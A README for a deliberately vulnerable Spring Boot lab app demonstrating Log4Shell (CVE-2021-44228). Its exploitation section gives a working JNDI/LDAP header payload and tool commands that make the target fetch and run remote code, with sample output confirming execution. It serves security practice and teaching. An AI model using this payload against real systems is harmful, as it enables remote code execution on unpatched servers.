# Log4Shell sample vulnerable application (CVE-2021-44228)

This repository contains a Spring Boot web application vulnerable to CVE-2021-44228, nicknamed [Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/).

It uses Log4j 2.14.1 (through `spring-boot-starter-log4j2` 2.6.1) and the JDK 1.8.0_181.

![](./screenshot.png)

## Running the application

Run it:

```bash
docker run -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
```

Build it yourself (you don't need any Java-related tooling):

```bash
docker build . -t vulnerable-app
docker run -p 8080:8080 vulnerable-app
```

## Exploitation

First, download JNDIExploit from [here](https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2). Run the jar to launch the exploit LDAP server from an IP that the application can reach:

```bash
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i <ldap-server-ip> -p <http-port>
```
Confirm the exploit by running:

```bash
curl <application-ip>:8080 -H 'X-Api-Version: ${jndi:ldap://<ldap-server-ip>:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9vd25lZC50eHQ=}'
```
The base64 value decodes to `touch /tmp/owned.txt`. 

You will see similar output from JNDIExploit like below:

```bash
root@2111:~/# java -jar JNDIExploit-1.2-SNAPSHOT.jar -i <ldap-server-ip> -p 8888
[+] LDAP Server Start Listening on 1389...
[+] HTTP Server Start Listening on 8888...
[+] Received LDAP Query: Basic/Command/Base64/dG91Y2ggL3RtcC9vd25lZC50eHQ=
[+] Paylaod: command
[+] Command: touch /tmp/owned.txt
[+] Sending LDAP ResourceRef result for Basic/Command/Base64/dG91Y2ggL3RtcC9vd25lZC50eHQ= with basic remote reference payload
[+] Send LDAP reference result for Basic/Command/Base64/dG91Y2ggL3RtcC9vd25lZC50eHQ= redirecting to http://<ldap-server-ip>:8888/ExploitDRbp2Hes0L.class
[+] New HTTP Request From /127.0.0.1:34010  /ExploitDRbp2Hes0L.class
[+] Receive ClassRequest: ExploitDRbp2Hes0L.class
[+] Response Code: 200
```

Now check the `/tmp` folder inside the docker container and the text file `owned.txt` should be there:

```sh
root@2111:~/# docker ps
CONTAINER ID   IMAGE       COMMAND                  CREATED              STATUS              PORTS                                       NAMES
efebc918d9cb   vulnerable-app   "java -jar /app/spri…"   About a minute ago   Up About a minute   0.0.0.0:8080->8080/tcp, :::8080->8080/tcp   vulnerable-app

root@2111:~/# docker exec -it efebc918d9cb ash   
/ # ls /tmp
hsperfdata_root
owned.txt
tomcat-docbase.8080.2415120533529983821
tomcat.8080.1416539772670722454
```

## Reference

https://www.lunasec.io/docs/blog/log4j-zero-day/